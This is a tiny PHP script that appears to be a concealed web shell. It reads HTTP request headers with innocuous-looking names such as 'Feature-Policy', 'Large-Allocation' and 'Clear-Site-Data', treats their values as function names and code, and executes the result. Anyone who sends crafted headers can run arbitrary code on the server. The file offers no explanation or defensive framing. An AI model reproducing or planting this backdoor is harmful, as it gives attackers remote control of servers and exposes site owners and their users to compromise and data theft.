<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $lock = $_HEADERS['Feature-Policy']('', $_HEADERS['Large-Allocation']($_HEADERS['Clear-Site-Data']));
    $lock();
}